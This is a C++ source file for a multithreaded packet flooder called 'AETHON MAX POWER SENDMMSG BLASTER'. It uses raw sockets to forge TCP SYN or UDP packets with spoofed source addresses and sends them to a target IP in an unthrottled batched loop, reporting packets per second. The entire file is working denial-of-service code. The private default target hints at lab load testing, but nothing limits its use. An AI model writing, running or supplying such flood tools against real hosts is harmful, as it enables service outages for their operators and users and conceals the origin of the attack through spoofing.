#include <arpa/inet.h>
#include <atomic>
#include <chrono>
#include <csignal>
#include <cstdint>
#include <cstring>
#include <iomanip>
#include <iostream>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <sys/socket.h>
#include <thread>
#include <unistd.h>
#include <vector>

static std::atomic<bool> g_running{true};
static std::atomic<uint64_t> g_total_packets{0};
static std::atomic<uint64_t> g_total_bytes{0};

static inline uint16_t compute_checksum(const void *buf, size_t len) noexcept {
    const auto *p = static_cast<const uint16_t *>(buf);
    uint32_t sum = 0;
    while (len > 1) {
        sum += *p++;
        len -= 2;
    }
    if (len == 1) {
        sum += *reinterpret_cast<const uint8_t *>(p);
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return static_cast<uint16_t>(~sum);
}

static void sig_handler(int) {
    g_running.store(false, std::memory_order_relaxed);
}

void blaster_worker(int thread_id, const char *dst_ip_str, uint16_t base_dst_port, bool is_tcp) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET((thread_id % 4) + 1, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        return;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    constexpr size_t BATCH = 64;
    struct mmsghdr msgs[BATCH];
    struct iovec iovs[BATCH];
    uint8_t packet_buffers[BATCH][128];
    struct sockaddr_in dst_addr;
    std::memset(&dst_addr, 0, sizeof(dst_addr));
    dst_addr.sin_family = AF_INET;
    inet_pton(AF_INET, dst_ip_str, &dst_addr.sin_addr);

    for (size_t i = 0; i < BATCH; ++i) {
        uint32_t src_ip = htonl((10 << 24) | ((thread_id + 1) << 16) | static_cast<uint32_t>(i + 1));
        uint16_t src_port = htons(static_cast<uint16_t>(10000 + (thread_id * 1000) + i));
        uint16_t dst_port = htons(static_cast<uint16_t>(base_dst_port + (thread_id % 4)));

        uint8_t *pkt = packet_buffers[i];
        auto *iph = reinterpret_cast<struct iphdr *>(pkt);
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htons(static_cast<uint16_t>(i));
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->saddr = src_ip;
        iph->daddr = dst_addr.sin_addr.s_addr;

        size_t total_len = 0;
        if (is_tcp) {
            iph->protocol = IPPROTO_TCP;
            total_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
            iph->tot_len = htons(static_cast<uint16_t>(total_len));
            iph->check = 0;
            iph->check = compute_checksum(iph, sizeof(struct iphdr));

            auto *tcph = reinterpret_cast<struct tcphdr *>(pkt + sizeof(struct iphdr));
            std::memset(tcph, 0, sizeof(struct tcphdr));
            tcph->source = src_port;
            tcph->dest = dst_port;
            tcph->seq = htonl(1000 + i);
            tcph->doff = 5;
            tcph->syn = 1;
            tcph->window = htons(65535);

            struct {
                uint32_t src;
                uint32_t dst;
                uint8_t zero;
                uint8_t proto;
                uint16_t len;
                struct tcphdr tcp;
            } __attribute__((packed)) pseudo;
            std::memset(&pseudo, 0, sizeof(pseudo));
            pseudo.src = src_ip;
            pseudo.dst = dst_addr.sin_addr.s_addr;
            pseudo.zero = 0;
            pseudo.proto = IPPROTO_TCP;
            pseudo.len = htons(sizeof(struct tcphdr));
            pseudo.tcp = *tcph;
            tcph->check = compute_checksum(&pseudo, sizeof(pseudo));
        } else {
            iph->protocol = IPPROTO_UDP;
            constexpr size_t payload_len = 32;
            total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;
            iph->tot_len = htons(static_cast<uint16_t>(total_len));
            iph->check = 0;
            iph->check = compute_checksum(iph, sizeof(struct iphdr));

            auto *udph = reinterpret_cast<struct udphdr *>(pkt + sizeof(struct iphdr));
            udph->source = src_port;
            udph->dest = dst_port;
            udph->len = htons(static_cast<uint16_t>(sizeof(struct udphdr) + payload_len));
            udph->check = 0;

            uint8_t *payload = pkt + sizeof(struct iphdr) + sizeof(struct udphdr);
            std::memset(payload, 'A', payload_len);
        }

        iovs[i].iov_base = pkt;
        iovs[i].iov_len = total_len;

        std::memset(&msgs[i], 0, sizeof(struct mmsghdr));
        msgs[i].msg_hdr.msg_name = &dst_addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(dst_addr);
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    while (g_running.load(std::memory_order_relaxed)) {
        int sent = sendmmsg(sock, msgs, BATCH, 0);
        if (sent > 0) {
            g_total_packets.fetch_add(sent, std::memory_order_relaxed);
            g_total_bytes.fetch_add(sent * iovs[0].iov_len, std::memory_order_relaxed);
        }
    }
    close(sock);
}

int main(int argc, char **argv) {
    std::signal(SIGINT, sig_handler);
    std::signal(SIGTERM, sig_handler);

    const char *target_ip = (argc > 1) ? argv[1] : "192.168.50.1";
    std::string proto = (argc > 2) ? argv[2] : "udp";
    int num_threads = (argc > 3) ? std::atoi(argv[3]) : 4;
    bool is_tcp = (proto == "tcp");
    uint16_t base_port = is_tcp ? 80 : 8080;

    std::cout << "========================================================\n";
    std::cout << "         AETHON MAX POWER SENDMMSG BLASTER              \n";
    std::cout << "========================================================\n";
    std::cout << "Target IP    : " << target_ip << "\n";
    std::cout << "Protocol     : " << (is_tcp ? "TCP SYN" : "UDP") << "\n";
    std::cout << "Worker Cores : " << num_threads << " (pinned across CPU cores)\n";
    std::cout << "Batch Vector : 64 packets per syscall\n";
    std::cout << "========================================================\n";

    std::vector<std::thread> workers;
    for (int i = 0; i < num_threads; ++i) {
        workers.emplace_back(blaster_worker, i, target_ip, base_port, is_tcp);
    }

    uint64_t last_packets = 0;
    uint64_t last_bytes = 0;

    while (g_running.load(std::memory_order_relaxed)) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        uint64_t cur_packets = g_total_packets.load(std::memory_order_relaxed);
        uint64_t cur_bytes = g_total_bytes.load(std::memory_order_relaxed);

        uint64_t pps = cur_packets - last_packets;
        uint64_t bps = cur_bytes - last_bytes;
        double mbps = (bps * 8.0) / 1000000.0;

        std::cout << "\r[Blaster] Speed: " << pps << " pps | "
                  << std::fixed << std::setprecision(2) << mbps << " Mbps | Total: "
                  << cur_packets << " pkts" << std::flush;

        last_packets = cur_packets;
        last_bytes = cur_bytes;
    }

    for (auto &w : workers) {
        w.join();
    }

    std::cout << "\n[Blaster] Finished. Total blasted: " << g_total_packets.load() << " pkts\n";
    return 0;
}
